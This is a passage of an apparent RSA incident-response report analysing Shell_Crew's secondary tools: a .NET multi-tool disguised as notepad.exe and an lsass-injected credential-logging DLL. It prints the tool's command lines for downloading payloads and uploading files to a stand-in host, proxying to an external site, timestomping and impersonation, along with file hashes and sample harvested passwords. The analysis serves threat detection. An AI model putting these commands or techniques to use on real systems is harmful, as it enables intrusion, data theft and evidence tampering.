@@ -1,0 +1,153 @@
+Secondary Tools – Technical Analysis
+Page 28
+This section contains the technical analysis of several secondary tools that are favored by Shell_Crew. The secondary tools
+are programs that facilitate lateral movement, harvesting of credentials, or allow for additional channels of communication.
+During recent engagements involving Shell_Crew, the secondary tools were introduced into the environment during the
+early stages of a compromise indicating that these are the preferred tools of this group. Shell_Crew also employs several
+additional tools that are commonly used by other threat groups and will not be covered in this report.
+1. Notepad.exe
+One of the preferred tools used by Shell_Crew during a recent incident was a multi-purpose tool typically named
+'notepad.exe’, but also found named ‘inetinfo.exe’ or ‘mszip.exe’. The collected sample of this tool was written in .NET 2.0
+and the code was obfuscated using the post-development recompilation system “Dotfuscator”. This tool does not have a
+built-in C2 address, however the code does support this feature. This tool requires arguments to be passed to it in order to
+perform activities. One of the most commonly used commands by the adversary was the proxy like functionality of this tool
+as show below in Figure 38.
+c:\dell\notepad.exe /f sh /x 10.192.59.10 /y 80 /s upload.msdnblog.com /p 443
+Figure 38: Common usage of notepad.exe
+In this example, the proxy functionality of notepad.exe allowed the adversary to proxy their traffic to the external site
+“upload.msdnblog.com” through internal IP address 10.192.59.10 on port 80.
+```
+         File Name: notepad.exe
+     File Size: 186880 bytes
+
+     MD5:    985abc913a294c096718892332631ec9
+
+     SHA1:    a0d2cb07842813ebcbf31e30895887740f01f5d7
+
+     PE Time:  0x4F3E6880 [Fri Feb 17 14:47:28 2012 UTC]
+
+     PEID Sig:  Microsoft Visual C# / Basic .NET
+
+     PEID Sig:  .NET executable compressor
+
+     Sections (3):
+
+     Name   Entropy MD5
+
+     .text   5.56   ab3d5c3c7dc3548585a8182ab8720f03
+
+     .rsrc   4.16   b5167609962c7d22da2e6e7aa7259e84
+
+     .reloc  0.1   2691c06804eb4834bdcf32c2e02ba33c
+
+```
+Figure 39: File details of notepad.exe
+RSA Emerging Threat Profile: Shell_Crew
+RSA Incident Response
+Page 29
+In order to decompile notepad.exe, the code was deobfuscated using a publicly available tool called “de4dot”. Once the
+code had been deobfuscated, notepad.exe could be decompiled for analysis using the tool “Reflector”.
+The RSA IR team was able to review the functionality of this tool and a complete list of the available parameters is provided
+in Table 3. During testing it was found that when this file was executed with no arguments, the tool performs the following
+actions:
+
+The tool would hash the string “alice'srabbithole ” (MD5: 75BAA77C842BE168B0F66C42C7885997)
+The tool then checks if the resource shown in Figure 40 starts with the hash value obtained in step 1 (in this case
+there is a match).
+
+Figure 40: Resource of notepad.exe
+
+If the result of step 2 is true, the Trojan exits without doing anything else. It is in this resource that the Trojan
+would otherwise find an IP address and port number to connect. The resource would have the format shown in
+Figure 41:
+
+Figure 41: Notepad.exe - built in C2 data structure
+The first two bytes of the resource will be a hexadecimal value representing the length of the Base64 encoded data that
+follows. The obfuscated data is first Base64 decoded, then XOR-ed with 0xAA. The obfuscated data is meant to be an IP
+address followed by a port number, separated by a colon “:”. The following figure shows the functions from the code.
+Figure 42: C2 obfuscation in notepad.exe
+RSA Emerging Threat Profile: Shell_Crew
+RSA Incident Response
+Page 30
+This tool can be executed in various ways depending on the arguments provided. Table 3 shows a complete this of the
+discovered parameters.
+|Notepad.exe arguments Purpose Sample Output|Col2|Col3|
+|---|---|---|
+|/f v|Version info|2 2.0.887.1303|
+|/f dl /url http://www.bad.com/trojan.jpg /file test.exe|Download file. Noobfuscation.|GET /trojan.jpg HTTP/1.1Host: www.bad.comConnection: Keep-Alive|
+|/f ul /url http://www.bad.com/exfil.txt /file exfil.txt|Upload a file. Noobfuscation|POST /exfil.txt HTTP/1.1Content-Type: multipart/form-data; boundary=---------------------8d02564845381faHost: www.bad.comContent-Length: 218Connection: Keep-Alive-----------------------8d02564845381faContent-Disposition: form-data; name="file"; filename="exfil.txt"Content-Type: application/octet-streamTHIS IS MY SENSITIVE DATA-----------------------8d02564845381fa--|
+|/f sh /x 192.168.1.1 /y 80 /s 10.10.10.1 /p 666 /u username/w password|HTTP proxy connect.|CONNECT 10.10.10.1:666 HTTP/1.0Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=[Actual adversary command: /f sh /x 10.19.59.10 /y 80 /supload.msdnblog.com /p 443]|
+|/f sh /l /p 666|Listener mode|When a client connects:03 01 74 80 0e d1 3b 4e  0c db 33 00 02 00 00 0077 03 00 00 00 00 00 00  00 00 00 00 00 00 00 00|
+|/f d /t exfil.txt|File info|Name=exfil.txtLength=25DirectoryName=C:\MALWAREDirectory={ }IsReadOnly=FalseExists=TrueFullName=C:\MALWARE\exfil.txtExtension=.txtCreationTime=5/23/2013CreationTimeUtc=5/23/2013LastAccessTime=5/23/2013LastAccessTimeUtc=5/23/2013LastWriteTime=5/23/2013LastWriteTimeUtc=5/23/2013Attributes=Archive|
+|notepad.exe /f cl /p directory /m patternregex options|Clean files and timestomp|Replace pattern on file in specified folder and time stomp backto original file timestamp.|
+|/f tu /p test /m tampered /r c:\windows\explorer.exe|Time stomp file|Match files with name “tampered” in directory test and changeCMA timestamps to match those of reference file “/r”.  If “/r”argument is not specified or if file is not found set to 11-30-200512:00PM UTC.|
+|/f ra /ru /rd /rp /wp arguments|RunAs command|ru – usernamerd – domain namerp – passwordwp – with profile|
+|/iu /id /ip|Impersonate user|iu – usernameid – domain nameip – password|
+RSA Emerging Threat Profile: Shell_Crew
+RSA Incident Response
+Page 31
+|Notepad.exe arguments Purpose Sample Output|Col2|Col3|
+|---|---|---|
+|/f rs|Impersonate user||
+|/f wmi|WindowsManagementInstrumentationcommands|s – systemu – usernamep – passworda – Kerberos impersonation levelm – WMI command:- query run WMI query- call call WMI- get [no logic to do anything]|
+Table 3: notepad.exe functionality
+2. Credential Logger
+On a compromised Windows system, credentials can be harvested in a variety of ways:
+- Hash Dumping
+
+- Keystroke logging
+
+- MSGINA man-in-the middle
+
+- Hooking Authentication Functions
+
+One such example that was observed during a recent engagement was a DLL file that Shell_Crew had injected into the
+lsass.exe process of a server to harvest credentials. The characteristics of this DLL file are shown in Figure 43.
+```
+             File Name: xmlobj.dll
+         File Size: 20480 bytes
+
+         MD5:    90eddad3327a63fdea924fb802bc7dc5
+
+         SHA1:    ecd9f328d119a82718634700f0e1fd5f19e9b08c
+
+         PE Time:  0x4F908F71 [Thu Apr 19 22:19:29 2012 UTC]
+
+         PEID Sig:  Microsoft Visual C++ v6.0 DLL
+
+         Sections (4):
+
+         Name   Entropy MD5
+
+         .text   4.21   445cb9843ec80eb2465a099f63fcdf0a
+
+         .rdata  1.04   f8e9796e79523ae3980491e67e33521d
+
+         .data   0.37   b77c7f741344e8c0326394129484cf5b
+
+         .reloc  0.61   1373d7f72c5ca95a4bc001b04e4dc710
+
+```
+Figure 43: Details of the file xmlobj.dll
+Once this DLL is injected into the lsass.exe process, it hooks the LsaApLogonUserEx2 function of msv1_0.dll. This function is
+called during various authentication situations such as interactive or network logons, including when the RunAs option is
+used. All credentials are saved in plaintext under: c:\windows\system32\desktop.ini.
+A sample of harvested credentials that would be stored in the desktop.ini file is shown in Figure 44.
+RSA Emerging Threat Profile: Shell_Crew
+RSA Incident Response
+Page 32
+```
+    Domain: mydomain
+UserID: administrator
+
+Passwd: P@ssword12
+
+Domain: mydomain
+UserID: john
+
+Passwd: NewYear2013
+
+```
+Figure 44: Sample of harvested credentials
+RSA Emerging Threat Profile: Shell_Crew
+RSA Incident Response
